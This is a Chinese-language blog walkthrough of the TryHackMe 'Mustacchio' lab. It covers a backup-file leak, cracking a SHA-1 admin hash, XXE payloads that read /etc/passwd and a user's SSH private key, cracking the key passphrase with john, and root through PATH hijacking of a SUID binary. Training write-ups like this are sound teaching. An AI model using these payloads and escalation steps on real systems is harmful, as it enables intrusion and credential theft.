@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Mustacchio | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="题目概述Mustacchio 是一台 Easy 难度的 Linux 渗透靶机。攻击路径从 Web 信息泄露开始，经过 XXE 注入读取 SSH 私钥、破解私钥密码、SSH 登录，最终通过 SUID 二进制文件的 PATH 劫持实现 root 提权。 攻击路径12信息收集 → 备份文件泄露 → XXE读取SSH私钥 → ssh2john破解 → barry用户    → SUID二进制分析 → PA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Mustacchio">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Mustacchio.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="题目概述Mustacchio 是一台 Easy 难度的 Linux 渗透靶机。攻击路径从 Web 信息泄露开始，经过 XXE 注入读取 SSH 私钥、破解私钥密码、SSH 登录，最终通过 SUID 二进制文件的 PATH 劫持实现 root 提权。 攻击路径12信息收集 → 备份文件泄露 → XXE读取SSH私钥 → ssh2john破解 → barry用户    → SUID二进制分析 → PA">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-23T12:10:22.164Z">
+<meta property="article:modified_time" content="2026-06-23T12:10:22.166Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="SUID">
+<meta property="article:tag" content="PATH劫持">
+<meta property="article:tag" content="XXE">
+<meta property="article:tag" content="SSH密钥破解">
+<meta property="article:tag" content="gobuster">
+<meta property="article:tag" content="SHA-1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Mustacchio.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Mustacchio',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-23 20:10:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">134</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Mustacchio</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-23T12:10:22.164Z" title="发表于 2026-06-23 20:10:22">2026-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-23T12:10:22.166Z" title="更新于 2026-06-23 20:10:22">2026-06-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_Mustacchio"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>Mustacchio 是一台 Easy 难度的 Linux 渗透靶机。攻击路径从 Web 信息泄露开始，经过 XXE 注入读取 SSH 私钥、破解私钥密码、SSH 登录，最终通过 SUID 二进制文件的 PATH 劫持实现 root 提权。</p>
+<h3 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">信息收集 → 备份文件泄露 → XXE读取SSH私钥 → ssh2john破解 → barry用户</span><br><span class="line">    → SUID二进制分析 → PATH劫持 → root</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1. 端口扫描"></a>1. 端口扫描</h2><table>
+<thead>
+<tr>
+<th align="left">端口</th>
+<th align="left">服务</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">22</td>
+<td align="left">SSH</td>
+<td align="left">OpenSSH 7.2p2 Ubuntu</td>
+</tr>
+<tr>
+<td align="left">80</td>
+<td align="left">HTTP</td>
+<td align="left">Apache&#x2F;2.4.18 — 博客网站</td>
+</tr>
+<tr>
+<td align="left">8765</td>
+<td align="left">HTTP</td>
+<td align="left">nginx&#x2F;1.10.3 — 登录管理页面</td>
+</tr>
+</tbody></table>
+<p>80 端口是一个简陋的博客网站，仅有几张图片，文章无法访问。8765 端口是一个登录页面。</p>
+<h2 id="2-目录扫描与信息泄露"><a href="#2-目录扫描与信息泄露" class="headerlink" title="2. 目录扫描与信息泄露"></a>2. 目录扫描与信息泄露</h2><h3 id="2-1-目录扫描"><a href="#2-1-目录扫描" class="headerlink" title="2.1 目录扫描"></a>2.1 目录扫描</h3><p>对 80 端口进行目录扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/wordlists/dirb/big.txt -u http://10.48.164.133</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">路径</th>
+<th align="left">状态码</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">&#x2F;custom</td>
+<td align="left">301</td>
+<td align="left">样式目录</td>
+</tr>
+<tr>
+<td align="left">&#x2F;fonts</td>
+<td align="left">301</td>
+<td align="left">字体目录</td>
+</tr>
+<tr>
+<td align="left">&#x2F;images</td>
+<td align="left">301</td>
+<td align="left">图片目录</td>
+</tr>
+<tr>
+<td align="left">&#x2F;robots.txt</td>
+<td align="left">200</td>
+<td align="left">robots 文件</td>
+</tr>
+<tr>
+<td align="left">&#x2F;server-status</td>
+<td align="left">403</td>
+<td align="left">禁止访问</td>
+</tr>
+</tbody></table>
+<h3 id="2-2-数据库备份泄露"><a href="#2-2-数据库备份泄露" class="headerlink" title="2.2 数据库备份泄露"></a>2.2 数据库备份泄露</h3><p>访问 <code>/custom/js</code> 目录，发现备份文件 <code>user.bak</code>，下载后以文本方式打开发现文件头为 SQL 格式标识，修改后缀为 <code>.db</code> 使用 SQLite 打开，获取到管理员凭证：</p>
+<blockquote>
+<p><strong>用户名</strong>：<code>admin</code><br><strong>密码哈希</strong>：<code>1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></p>
+</blockquote>
+<p>哈希长度为 40 位，判断为 <strong>SHA-1</strong>，使用 CrackStation 解密得到明文：<code>bulldog19</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../image/TryHackMe_Mustacchio/file-20260623113412013.png"></p>
+<h2 id="3-管理后台与-XXE-注入"><a href="#3-管理后台与-XXE-注入" class="headerlink" title="3. 管理后台与 XXE 注入"></a>3. 管理后台与 XXE 注入</h2><h3 id="3-1-登录管理后台"><a href="#3-1-登录管理后台" class="headerlink" title="3.1 登录管理后台"></a>3.1 登录管理后台</h3><p>使用 <code>admin</code> &#x2F; <code>bulldog19</code> 登录 8765 端口的管理后台，发现仅有添加评论的功能。尝试 XSS 无效，预览始终为空。</p>
+<h3 id="3-2-源码注释泄露"><a href="#3-2-源码注释泄露" class="headerlink" title="3.2 源码注释泄露"></a>3.2 源码注释泄露</h3><p>F12 检查页面源代码，发现两条关键注释：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//document.cookie = &quot;Example=/auth/dontforget.bak&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Barry, you can now SSH in using your key!--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../image/TryHackMe_Mustacchio/file-20260623121913622.png"></p>
+<blockquote>
+<p>💡 <strong>线索汇总</strong>：第一条注释指向备份文件路径，第二条暗示 Barry 可通过 SSH 密钥登录。</p>
+</blockquote>
+<h3 id="3-3-XML-备份文件分析"><a href="#3-3-XML-备份文件分析" class="headerlink" title="3.3 XML 备份文件分析"></a>3.3 XML 备份文件分析</h3><p>访问 <code>/auth/dontforget.bak</code>，下载后为 XML 格式文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span>his paragraph was a waste of time and space...<span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合源码中 JS 弹窗提示 <code>Insert XML Code!</code>，说明评论输入框接受 <strong>XML 格式</strong> 的内容。输入备份文件中的 XML 内容并提交，成功在页面上渲染出了对应内容。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../image/TryHackMe_Mustacchio/file-20260623122529452.png"></p>
+<h3 id="3-4-XXE-漏洞利用"><a href="#3-4-XXE-漏洞利用" class="headerlink" title="3.4 XXE 漏洞利用"></a>3.4 XXE 漏洞利用</h3><p>既然输入的 XML 内容会被服务端解析，则存在 <strong>XXE（XML External Entity）注入</strong> 漏洞。</p>
+<p><strong>步骤 1 — 验证 XXE</strong>：读取 <code>/etc/passwd</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>User<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功输出 passwd 内容，确认 XXE 可用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Name: Test</span><br><span class="line">Author : User</span><br><span class="line">Comment :  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash </span><br><span class="line">...</span><br><span class="line">joe:x:1002:1002::/home/joe:/bin/bash</span><br><span class="line">barry:x:1003:1003::/home/barry:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2 — 读取 Barry 的 SSH 私钥</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/barry/.ssh/id_rsa&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>User<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功获取到加密的 RSA 私钥。</p>
+<h2 id="4-SSH-私钥破解与登录"><a href="#4-SSH-私钥破解与登录" class="headerlink" title="4. SSH 私钥破解与登录"></a>4. SSH 私钥破解与登录</h2><p>将私钥保存为 <code>barry_rsa</code>，赋予 600 权限，使用 <code>ssh2john</code> 转化为哈希后用 John 破解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存并设置权限</span></span><br><span class="line"><span class="built_in">chmod</span> 600 barry_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为哈希</span></span><br><span class="line">ssh2john barry_rsa &gt; barry_hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解密码</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt barry_hash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="line">...</span><br><span class="line">urieljames       (barry_rsa)     </span><br><span class="line">1g 0:00:00:03 DONE</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>🔑 <strong>私钥密码</strong>：<code>urieljames</code></p>
+</blockquote>
+<p>使用私钥登录 Barry 用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh barry@10.48.180.199 -i barry_rsa</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;barry_key&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 16.04.7 LTS</span><br><span class="line"></span><br><span class="line">barry@mustacchio:~$ <span class="built_in">id</span></span><br><span class="line">uid=1003(barry) gid=1003(barry) <span class="built_in">groups</span>=1003(barry)</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-SUID-提权-—-PATH-劫持"><a href="#5-SUID-提权-—-PATH-劫持" class="headerlink" title="5. SUID 提权 — PATH 劫持"></a>5. SUID 提权 — PATH 劫持</h2><h3 id="5-1-查找-SUID-文件"><a href="#5-1-查找-SUID-文件" class="headerlink" title="5.1 查找 SUID 文件"></a>5.1 查找 SUID 文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现位于 Joe 用户目录下的特殊 SUID 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/joe/live_log</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-二进制分析"><a href="#5-2-二进制分析" class="headerlink" title="5.2 二进制分析"></a>5.2 二进制分析</h3><p>查看文件权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barry@mustacchio:/home/joe$ <span class="built_in">ls</span> -la</span><br><span class="line">-rwsr-x--- 1 root joe 16832 Jun 12  2021 live_log</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>scp</code> 下载到本地后用 <strong>IDA 反编译</strong>，发现关键代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);    <span class="comment">// 设置为 root 权限</span></span><br><span class="line">  setgid(<span class="number">0</span>);    <span class="comment">// 设置为 root 组</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Live Nginx Log Reader&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;tail -f /var/log/nginx/access.log&quot;</span>);  <span class="comment">// 未使用完整路径！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>漏洞点</strong>：该程序以 root 权限运行（<code>setuid(0)</code>），但调用 <code>system()</code> 时使用了<strong>裸命令名 <code>tail</code></strong> 而非绝对路径 <code>/usr/bin/tail</code>，因此可以通过修改 <code>PATH</code> 环境变量实现<strong>命令劫持</strong>。</p>
+</blockquote>
+<h3 id="5-3-PATH-劫持提权"><a href="#5-3-PATH-劫持提权" class="headerlink" title="5.3 PATH 劫持提权"></a>5.3 PATH 劫持提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建恶意 tail 文件</span></span><br><span class="line">barry@mustacchio:/tmp$ <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; <span class="built_in">tail</span></span><br><span class="line">barry@mustacchio:/tmp$ <span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -p&#x27;</span> &gt;&gt; <span class="built_in">tail</span></span><br><span class="line">barry@mustacchio:/tmp$ <span class="built_in">chmod</span> +x <span class="built_in">tail</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 /tmp 加入 PATH 最前端</span></span><br><span class="line">barry@mustacchio:/tmp$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 SUID 程序，触发恶意 tail</span></span><br><span class="line">barry@mustacchio:/tmp$ /home/joe/live_log</span><br><span class="line">root@mustacchio:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1003(barry)</span><br></pre></td></tr></table></figure>
+
